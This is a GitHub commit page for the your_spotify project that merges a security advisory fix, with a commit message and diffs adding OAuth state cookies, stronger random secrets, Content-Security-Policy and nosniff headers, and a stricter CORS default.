=== Content from github.com_7b8cfddc_20250111_165343.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYooooomi%2Fyour_spotify%2Fcommit%2Fc3ae87673910c9903bb53088c8b71ed2c9aa54e4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FYooooomi%2Fyour_spotify%2Fcommit%2Fc3ae87673910c9903bb53088c8b71ed2c9aa54e4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=Yooooomi%2Fyour_spotify)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Yooooomi](/Yooooomi)
/
**[your\_spotify](/Yooooomi/your_spotify)**
Public

* [Notifications](/login?return_to=%2FYooooomi%2Fyour_spotify) You must be signed in to change notification settings
* [Fork
  140](/login?return_to=%2FYooooomi%2Fyour_spotify)
* [Star
   3.3k](/login?return_to=%2FYooooomi%2Fyour_spotify)

* [Code](/Yooooomi/your_spotify)
* [Issues
  97](/Yooooomi/your_spotify/issues)
* [Pull requests
  7](/Yooooomi/your_spotify/pulls)
* [Discussions](/Yooooomi/your_spotify/discussions)
* [Actions](/Yooooomi/your_spotify/actions)
* [Projects
  0](/Yooooomi/your_spotify/projects)
* [Security](/Yooooomi/your_spotify/security)
* [Insights](/Yooooomi/your_spotify/pulse)

Additional navigation options

* [Code](/Yooooomi/your_spotify)
* [Issues](/Yooooomi/your_spotify/issues)
* [Pull requests](/Yooooomi/your_spotify/pulls)
* [Discussions](/Yooooomi/your_spotify/discussions)
* [Actions](/Yooooomi/your_spotify/actions)
* [Projects](/Yooooomi/your_spotify/projects)
* [Security](/Yooooomi/your_spotify/security)
* [Insights](/Yooooomi/your_spotify/pulse)

## Commit

[Permalink](/Yooooomi/your_spotify/commit/c3ae87673910c9903bb53088c8b71ed2c9aa54e4)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request from [GHSA-hfgf-99p3-6fjj](https://github.com/Yooooomi/your_spotify/security/advisories/GHSA-hfgf-99p3-6fjj "GHSA-hfgf-99p3-6fjj")

[Browse files](/Yooooomi/your_spotify/tree/c3ae87673910c9903bb53088c8b71ed2c9aa54e4)
Browse the repository at this point in the history

```
* More secure OAuth, fixed frame ancestors

* Change generateRandomString to return base64-encoded entropy

While the old implementation also seems to yield correct results, it is
(at least in my opinion) not obvious that it is correct and sufficiently
secure for the following reasons:

1. It takes the output string length as a parameter instead of the
   required amount of entropy.
   For cryptographic applications, it is important to know how much
   entropy any generated secret contains. Therefore, the input to the
   function should be the required bytes of entropy instead of the
   output string length.

2. While it uses a rather simple algorithm to convert the entropy bytes
   to a string, using a well-known and dead simple encoding such as
   base64 (or hexadecimal, but base64 is more compact) is even easier to
   verify as "obviously correct". In this case URL-safe base64 is chosen
   because the values are also used in URLs.

All usages of the function were also changed to accomodate the parameter
change to requested bytes of entropy. For all of them 32 bytes (256
bits) of entropy were chosen, which nicely fits the purpose of being
used for SHA256 and is definitely enough entropy for things like OAuth
'state'.

* Apply more restrictive CSP and prevent MIME sniffing for backend

As the backend doesn't show HTML pages to users, a very restrictive CSP
can be used. I'm currently not aware of any active issues, but being as
restrictive as possible doesn't hurt, which is what default-src 'none'
does.

Also, set "X-Content-Type-Options: nosniff" to prevent MIME sniffing in
browsers, which can also be an issue in certain circumstances.

* Implement a basic Content-Security-Policy in the client

This commit implements a basic CSP in the client by setting it as a
<meta> tag in index.html. Normally it would be preferred to set the CSP
in a HTTP header, but the react dev server does not seem to support
that. However, it is very important to have the CSP active during
development to catch errors caused by a restrictive CSP before deploying
to production.

Note that a header-based CSP is still required to set
"frame-ancestors 'none'" to prevent clickjacking. It is perfectly fine
to set the CSP both in the <meta> tag and in the HTTP header, both CSPs
will be applied.

There is still room for improvement in the CSP. With some effort, the
script-src could be further restricted using a combination of hashes or
nonces and 'strict-dynamic' to get rid of 'self'. The connect-src could
also be restricted to only the backend origin.

That being said, this is still a very good starting point and much
better than not having a CSP at all.

* Prevent MIME sniffing for the client in production

Prevent MIME sniffing for the client in production by setting the header
"X-Content-Type-Options: nosniff".

* Use only the origin of CLIENT_ENDPOINT for CORS policy

When the full CLIENT_ENDPOINT is used to set the CORS policy, the policy
does not get applied correctly when the client is served under a
subdirectory. Always using the origin fixes this.

* removed pkce, connect-src is dynamic

* ensuring API_ENDPOINT ends with a /

* make sure api endpoint ends with a slash, updated CORS notice

* fixed comment on index.html

---------

Co-authored-by: Marius Renner <marius@mariusrenner.de>
```

* Loading branch information

[![@Yooooomi](https://avatars.githubusercontent.com/u/17204739?s=40&v=4)](/Yooooomi) [![@RagingCactus](https://avatars.githubusercontent.com/u/1112236?s=40&v=4)](/RagingCactus)

[Yooooomi](/Yooooomi/your_spotify/commits?author=Yooooomi "View all commits by Yooooomi")
and
[RagingCactus](/Yooooomi/your_spotify/commits?author=RagingCactus "View all commits by RagingCactus")
authored
Mar 12, 2024

1 parent
[cd83dda](/Yooooomi/your_spotify/commit/cd83ddad34d630c5ab4fdd4e1c88cafb0fd66fd5)

commit c3ae876

 Show file tree

 Hide file tree

Showing
**14 changed files**
with
**242 additions**
and
**97 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* README.md
  [README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5)
* apps

  + client

    - public

      * apps/client/public/index.html
        [index.html](#diff-e92afe925c2f59456c14d99b3c83b512767285242c60a258e1eb780e49b10805)
    - scripts/run

      * apps/client/scripts/run/serve.json
        [serve.json](#diff-3f419ed28f4836ee47eea14e5cac404934bd408414ddb63ac579db2358194f55)
      * apps/client/scripts/run/serve.sh
        [serve.sh](#diff-4f38a823cb4add6b2ea0ee8374ea8b79654f893884711db115c8402f83679ec7)
      * apps/client/scripts/run/variables.sh
        [variables.sh](#diff-0b34a42cfe27c85c5110e97cfa68b1173a2bbd0ce6b180d411961e7be3acce51)
  + server

    - scripts/run

      * apps/server/scripts/run/deprecated.sh
        [deprecated.sh](#diff-f8e7719487c3003f8e1328127edc97b3bb91c91a2606c4e09b6698981f96ca38)
    - src

      * apps/server/src/app.ts
        [app.ts](#diff-cce8a19fada293c9b2fc1e6aa9abcc0c3aaa126fa3370391bb25398c7073a469)
      * database/queries

        + apps/server/src/database/queries/privateData.ts
          [privateData.ts](#diff-85fe400cde89de508966dbaa9336f6d506cc3bd04981e1b26fccaad4c6df558d)
      * routes

        + apps/server/src/routes/oauth.ts
          [oauth.ts](#diff-71e9a4632dd3a5c5a3ec10c097224db72fe59dd3b225f927e51710eae3331b1b)
        + apps/server/src/routes/search.ts
          [search.ts](#diff-01efe44e066c8d0ffc88f28ce6ca4827c444d1c6ae8d3e5dae6ac4f2c925ec2b)
      * tools

        + apps/server/src/tools/crypto.ts
          [crypto.ts](#diff-ede67424882ac6d2b9ea7d07e953928f4a83e0f0f154bbf8d9dd335bf169b0e1)
        + apps/server/src/tools/env.ts
          [env.ts](#diff-5db8427e1cee0dce9384c180167d7c78dda0019c02651db051df08b9d2330db7)
        + oauth

          - apps/server/src/tools/oauth/Provider.ts
            [Provider.ts](#diff-ea1acc341b5f8f2c11821d66351316d4802f3ec0db68986fd12d9b933223051d)
* monorepo.code-workspace
  [monorepo.code-workspace](#diff-b772b2955764603e0c6ec382494a1050365ba8fc744c26c0f27c5176ad2de893)

## There are no files selected for viewing

7 changes: 3 additions & 4 deletions

7
[README.md](#diff-b335630551682c19a781afebcf4d07bf978fb1f8ac04c6bf87428ed5106870f5 "README.md")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/README.md)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |

| Expand Up | | @@ -91,7 +91,7 @@ You can follow the instructions [here](https://github.com/Yooooomi/your\_spotify/ |
|  |  | | API\_ENDPOINT | REQUIRED | The endpoint of your server | |
|  |  | | SPOTIFY\_PUBLIC | REQUIRED | The public key of your Spotify application (cf [Creating the Spotify Application](#creating-the-spotify-application)) | |
|  |  | | SPOTIFY\_SECRET | REQUIRED | The secret key of your Spotify application (cf [Creating the Spotify Application](#creating-the-spotify-application)) | |
|  |  | | CORS | \_not defined\_ | List of comma-separated origin allowed, or \_nothing\_ to allow any origin | |
|  |  | | CORS | \_not defined\_ | List of comma-separated origin allowed | |
|  |  | | MAX\_IMPORT\_CACHE\_SIZE | Infinite | The maximum element in the cache when importing data from an outside source, more cache means less requests to Spotify, resulting in faster imports | |
|  |  | | MONGO\_ENDPOINT | mongodb://mongo:27017/your\_spotify | The endpoint of the Mongo database, where \*\*mongo\*\* is the name of your service in the compose file | |
|  |  | | PORT | 8080 | The port of the server, do not modify if you're using docker | |
| Expand All | | @@ -102,10 +102,9 @@ You can follow the instructions [here](https://github.com/Yooooomi/your\_spotify/ |
|  |  |  |
|  |  | ## CORS |
|  |  |  |
|  |  | You can edit the CORS for the server: |
|  |  |  |
|  |  | - `all` will allow every source. |
|  |  | - Not defining it will default to authorize only the `CLIENT\_ENDPOINT` origin. |
|  |  | - `origin1,origin2` will allow `origin1` and `origin2`. |
|  |  | > If you really want to allow every origin no matter what, you can set the `CORS` value to `i-want-a-security-vulnerability-and-want-to-allow-all-origins`. |
|  |  |  |
|  |  | # Creating the Spotify Application |
|  |  |  |
| Expand Down | |  |

76 changes: 45 additions & 31 deletions

76
[apps/client/public/index.html](#diff-e92afe925c2f59456c14d99b3c83b512767285242c60a258e1eb780e49b10805 "apps/client/public/index.html")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/client/public/index.html)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,33 +1,47 @@ |
|  |  | <!DOCTYPE html> |
|  |  | <html lang="en"> |
|  |  | <head> |
|  |  | <meta charset="utf-8" /> |
|  |  | <link rel="icon" href="%PUBLIC\_URL%/favicon.ico" /> |
|  |  | <link rel="apple-touch-icon" href="%PUBLIC\_URL%/logo192.png" /> |
|  |  | <link rel="manifest" href="%PUBLIC\_URL%/manifest.json" /> |
|  |  | <script src="%PUBLIC\_URL%/variables.js"></script> |
|  |  |  |
|  |  | <title>Your Spotify</title> |
|  |  | <meta name="viewport" content="width=device-width, initial-scale=1" /> |
|  |  | <meta name="theme-color" content="#000000" /> |
|  |  |  |
|  |  | <meta name="title" content="Your Spotify"> |
|  |  | <meta name="description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  |  |
|  |  | <meta property="og:type" content="image/png"> |
|  |  | <meta property="og:title" content="Your Spotify"> |
|  |  | <meta property="og:image:width" content="1200"> |
|  |  | <meta property="og:image:height" content="628"> |
|  |  | <meta property="og:description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  | <meta property="og:image" content="http://localhost:8080/static/your\_spotify\_1200.png"> |
|  |  |  |
|  |  | <meta property="twitter:card" content="summary"> |
|  |  | <meta property="twitter:title" content="Your Spotify"> |
|  |  | <meta property="twitter:description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  | <meta property="twitter:image" content="http://localhost:8080/static/your\_spotify\_1200.png"> |
|  |  | </head> |
|  |  | <body> |
|  |  | <noscript>You need to enable JavaScript to run this app.</noscript> |
|  |  | <div id="root"></div> |
|  |  | </body> |
|  |  | </html> |
|  |  |  |
|  |  | <head> |
|  |  | <meta charset="utf-8" /> |
|  |  |  |
|  |  | <!-- |
|  |  | While setting the CSP in HTTP headers is preferred, there does not seem to |
|  |  | be a good way to do this in the react dev environment, so it is set here as |
|  |  | a meta tag. Note that frame-ancestors CANNOT be set in the meta tag and |
|  |  | MUST be set as a HTTP header in production! |
|  |  |  |
|  |  | Restricting connect-src is done at start of the client server. |
|  |  | --> |
|  |  | <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https://i.scdn.co; connect-src \*;" /> |
|  |  |  |
|  |  | <link rel="icon" href="%PUBLIC\_URL%/favicon.ico" /> |
|  |  | <link rel="apple-touch-icon" href="%PUBLIC\_URL%/logo192.png" /> |
|  |  | <link rel="manifest" href="%PUBLIC\_URL%/manifest.json" /> |
|  |  | <script src="%PUBLIC\_URL%/variables.js"></script> |
|  |  |  |
|  |  | <title>Your Spotify</title> |
|  |  | <meta name="viewport" content="width=device-width, initial-scale=1" /> |
|  |  | <meta name="theme-color" content="#000000" /> |
|  |  |  |
|  |  | <meta name="title" content="Your Spotify"> |
|  |  | <meta name="description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  |  |
|  |  | <meta property="og:type" content="image/png"> |
|  |  | <meta property="og:title" content="Your Spotify"> |
|  |  | <meta property="og:image:width" content="1200"> |
|  |  | <meta property="og:image:height" content="628"> |
|  |  | <meta property="og:description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  | <meta property="og:image" content="http://localhost:8080/static/your\_spotify\_1200.png"> |
|  |  |  |
|  |  | <meta property="twitter:card" content="summary"> |
|  |  | <meta property="twitter:title" content="Your Spotify"> |
|  |  | <meta property="twitter:description" content="Keep track of your Spotify listening habits with Your Spotify."> |
|  |  | <meta property="twitter:image" content="http://localhost:8080/static/your\_spotify\_1200.png"> |
|  |  | </head> |
|  |  |  |
|  |  | <body> |
|  |  | <noscript>You need to enable JavaScript to run this app.</noscript> |
|  |  | <div id="root"></div> |
|  |  | </body> |
|  |  |  |
|  |  | </html> |

17 changes: 17 additions & 0 deletions

17
[apps/client/scripts/run/serve.json](#diff-3f419ed28f4836ee47eea14e5cac404934bd408414ddb63ac579db2358194f55 "apps/client/scripts/run/serve.json")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/client/scripts/run/serve.json)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,17 @@ |
|  |  | { |
|  |  | "headers": [ |
|  |  | { |
|  |  | "source": "\*", |
|  |  | "headers": [ |
|  |  | { |
|  |  | "key": "Content-Security-Policy", |
|  |  | "value": "frame-ancestors 'none';" |
|  |  | }, |
|  |  | { |
|  |  | "key": "X-Content-Type-Options", |
|  |  | "value": "nosniff" |
|  |  | } |
|  |  | ] |
|  |  | } |
|  |  | ] |
|  |  | } |

2 changes: 1 addition & 1 deletion

2
[apps/client/scripts/run/serve.sh](#diff-4f38a823cb4add6b2ea0ee8374ea8b79654f893884711db115c8402f83679ec7 "apps/client/scripts/run/serve.sh")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/client/scripts/run/serve.sh)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -4,4 +4,4 @@ |
|  |  | # -l 0.0.0.0 means that it's hosted on all the interfaces |
|  |  | # build/ is the output of the package built at build-time |
|  |  |  |
|  |  | serve -s -l tcp://0.0.0.0:3000 /app/apps/client/build/ |
|  |  | serve -c /app/apps/client/scripts/run/serve.json -s -l tcp://0.0.0.0:3000 /app/apps/client/build/ |

8 changes: 8 additions & 0 deletions

8
[apps/client/scripts/run/variables.sh](#diff-0b34a42cfe27c85c5110e97cfa68b1173a2bbd0ce6b180d411961e7be3acce51 "apps/client/scripts/run/variables.sh")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/client/scripts/run/variables.sh)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -18,6 +18,14 @@ then |
|  |  |  |
|  |  | # Editing meta image urls |
|  |  | sed -i "s;image\" content=\"\(.[^\"]\*\);image\" content=\"$API\_ENDPOINT/static/your\_spotify\_1200.png;g" "$VAR\_PATH/index.html" |
|  |  |  |
|  |  | # Restricting connect-src to API\_ENDPOINT with a trailing / |
|  |  | API\_ENDPOINT\_ENDING\_WITH\_SLASH=$API\_ENDPOINT |
|  |  | if [[ "$API\_ENDPOINT\_ENDING\_WITH\_SLASH" != \*/ ]] |
|  |  | then |
|  |  | API\_ENDPOINT\_ENDING\_WITH\_SLASH="$API\_ENDPOINT\_ENDING\_WITH\_SLASH/" |
|  |  | fi |
|  |  | sed -i "s#connect-src \(.\*\);#connect-src $API\_ENDPOINT\_ENDING\_WITH\_SLASH;#g" "$VAR\_PATH/index.html" |
|  |  | else |
|  |  | echo "API\_ENDPOINT is not defined, web app won't work" |
|  |  | exit 1 |
| Expand Down | |  |

3 changes: 2 additions & 1 deletion

3
[apps/server/scripts/run/deprecated.sh](#diff-f8e7719487c3003f8e1328127edc97b3bb91c91a2606c4e09b6698981f96ca38 "apps/server/scripts/run/deprecated.sh")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/server/scripts/run/deprecated.sh)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -2,5 +2,6 @@ |
|  |  |  |
|  |  | if [ "$CORS" == "all" ] |
|  |  | then |
|  |  | echo "Setting CORS to 'all' is not needed anymore, omitting it is the new way of authorizing every origin." |
|  |  | echo "Setting CORS to 'all' is not authorized anymore. To allow all sources, please specify CORS=i-want-a-security-vulnerability-and-want-to-allow-all-origins" |
|  |  | exit 1 |
|  |  | fi |

26 changes: 24 additions & 2 deletions

26
[apps/server/src/app.ts](#diff-cce8a19fada293c9b2fc1e6aa9abcc0c3aaa126fa3370391bb25398c7073a469 "apps/server/src/app.ts")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/server/src/app.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,9 +17,13 @@ import { get } from "./tools/env"; |
|  |  | import { LogLevelAccepts } from "./tools/logger"; |
|  |  |  |
|  |  | const app = express(); |
|  |  | const ALLOW\_ALL\_CORS = |
|  |  | "i-want-a-security-vulnerability-and-want-to-allow-all-origins"; |
|  |  |  |
|  |  | let corsValue = get("CORS")?.split(","); |
|  |  | if (corsValue?.[0] === "all") { |
|  |  | let corsValue: string[] | undefined = get("CORS")?.split(",") ?? [ |
|  |  | new URL(get("CLIENT\_ENDPOINT")).origin, |
|  |  | ]; |
|  |  | if (corsValue?.[0] === ALLOW\_ALL\_CORS) { |
|  |  | corsValue = undefined; |
|  |  | } |
|  |  |  |
| Expand All | | @@ -31,6 +35,24 @@ app.use( |
|  |  | }), |
|  |  | ); |
|  |  |  |
|  |  | app.use((\_, res, next) => { |
|  |  | // Apply security headers for the whole backend here |
|  |  |  |
|  |  | // Apply a restrictive CSP for the server API just in case. As there isn't any |
|  |  | // HTML content here, "default-src 'none'" is a good deny-all default in case |
|  |  | // an attacker tries something funny. |
|  |  | // "frame-ancestors 'none'" is required because frame-ancestors doesn't fall |
|  |  | // back to default-src and nobody has legitimate business framing the backend. |
|  |  | res.header( |
|  |  | "Content-Security-Policy", |
|  |  | "default-src 'none'; object-src 'none'; frame-ancestors 'none';" |
|  |  | ); |
|  |  |  |
|  |  | // Prevent MIME sniffing in browsers |
|  |  | res.header("X-Content-Type-Options", "nosniff"); |
|  |  | next(); |
|  |  | }); |
|  |  |  |
|  |  | if (LogLevelAccepts("info")) { |
|  |  | app.use(morgan("dev")); |
|  |  | } |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[apps/server/src/database/queries/privateData.ts](#diff-85fe400cde89de508966dbaa9336f6d506cc3bd04981e1b26fccaad4c6df558d "apps/server/src/database/queries/privateData.ts")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/server/src/database/queries/privateData.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,8 +1,8 @@ |
|  |  | import { randomUUID } from "crypto"; |
|  |  | import { generateRandomString } from "../../tools/crypto"; |
|  |  | import { PrivateDataModel } from "../Models"; |
|  |  |  |
|  |  | export async function createPrivateData() { |
|  |  | await PrivateDataModel.create({ jwtPrivateKey: randomUUID() }); |
|  |  | await PrivateDataModel.create({ jwtPrivateKey: generateRandomString(32) }); |
|  |  | } |
|  |  |  |
|  |  | export async function getPrivateData() { |
| Expand Down | |  |

135 changes: 96 additions & 39 deletions

135
[apps/server/src/routes/oauth.ts](#diff-71e9a4632dd3a5c5a3ec10c097224db72fe59dd3b225f927e51710eae3331b1b "apps/server/src/routes/oauth.ts")

Show comments

[View file](/Yooooomi/your_spotify/blob/c3ae87673910c9903bb53088c8b71ed2c9aa54e4/apps/server/src/routes/oauth.ts)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,6 @@ |
|  |  | import { Router } from "express"; |
|  |  | import { Request, Response, Router } from "express"; |
|  |  | import { sign } from "jsonwebtoken"; |
|  |  | import { z } from "zod"; |
|  |  | import { |
|  |  | createUser, |
|  |  | getUserCount, |
| Expand All | | @@ -10,16 +11,39 @@ import { get, getWithDefault } from "../tools/env"; |
|  |  | import { logger } from "../tools/logger"; |
|  |  | import { |
|  |  | logged, |
|  |  | validating, |
|  |  | withGlobalPreferences, |
|  |  | withHttpClient, |
|  |  | } from "../tools/middleware"; |
|  |  | import { Spotify } from "../tools/oauth/Provider"; |
|  |  | import { GlobalPreferencesRequest, SpotifyRequest } from "../tools/types"; |
|  |  | import { |
|  |  | GlobalPreferencesRequest, |
|  |  | SpotifyRequest, |
|  |  | TypedPayload, |
|  |  | } from "../tools/types"; |
|  |  | import { getPrivateData } from "../database/queries/privateData"; |
|  |  |  |
|  |  | export const router = Router(); |
|  |  |  |
|  |  | router.get("/spotify", async (\_, res) => { |
|  |  | function storeTokenInCookie( |
|  |  | request: Request, |
|  |  | response: Response, |
|  |  | token: string, |
|  |  | ) { |
|  |  | response.cookie("token", token, { |
|  |  | sameSite: "strict", |
|  |  | httpOnly: true, |
|  |  | secure: request.secure, |
|  |  | }); |
|  |  | } |
|  |  |  |
|  |  | const OAUTH\_COOKIE\_NAME = "oauth"; |
|  |  | const spotifyCallbackOAuthCookie = z.object({ |
|  |  | state: z.string(), |
|  |  | }); |
|  |  | type OAuthCookie = z.infer<typeof spotifyCallbackOAuthCookie>; |
|  |  |  |
|  |  | router.get("/spotify", async (req, res) => { |
|  |  | const isOffline = get("OFFLINE\_DEV\_ID"); |
|  |  | if (isOffline) { |
|  |  | const privateData = await getPrivateData(); |
| Expand All | | @@ -29,52 +53,85 @@ router.get("/spotify", async (\_, res) => { |
|  |  | const token = sign({ userId: isOffline }, privateData.jwtPrivateKey, { |
|  |  | expiresIn: getWithDefault("COOKIE\_VALIDITY\_MS", "1h"), |
|  |  | }); |
|  |  | res.cookie("token", token); |
|  |  | storeTokenInCookie(req, res, token); |
|  |  | res.status(204).end(); |
|  |  | return; |
|  |  | } |
|  |  | res.redirect(Spotify.getRedirect()); |
|  |  | const { url, state } = await Spotify.getRedirect(); |
|  |  | const oauthCookie: OAuthCookie = { |
|  |  | state, |
|  |  | }; |
|  |  |  |
|  |  | res.cookie(OAUTH\_COOKIE\_NAME, oauthCookie, { |
|  |  | sameSite: "lax", |
|  |  | httpOnly: true, |
|  |  | secure: req.secure, |
|  |  | }); |
|  |  |  |
|  |  | res.redirect(url); |
|  |  | }); |
|  |  |  |
|  |  | router.get("/spotify/callback", withGlobalPreferences, async (req, res) => { |
|  |  | const { query, globalPreferences } = req as GlobalPreferencesRequest; |
|  |  | const { code } = query; |
|  |  | const spotifyCallback = z.object({ |
|  |  | code: z.string(), |
|  |  | state: z.string(), |
|  |  | }); |
|  |  |  |
|  |  | const infos = await Spotify.exchangeCode(code as string); |
|  |  | router.get( |
|  |  | "/spotify/callback", |
|  |  | validating(spotifyCallback, "query"), |
|  |  | withGlobalPreferences, |
|  |  | async (req, res) => { |
|  |  | const { query, globalPreferences } = req as GlobalPreferencesRequest; |
|  |  | const { code, state } = query as TypedPayload<typeof spotifyCallback>; |
|  |  |  |
|  |  | try { |
|  |  | const client = Spotify.getHttpClient(infos.accessToken); |
|  |  | const { data: spotifyMe } = await client.get("/me"); |
|  |  | let user = await getUserFromField("spotifyId", spotifyMe.id, false); |
|  |  | if (!user) { |
|  |  | if (!globalPreferences.allowRegistrations) { |
|  |  | return res.redirect(`${get("CLIENT\_ENDPOINT")}/registrations-disabled`); |
|  |  | try { |
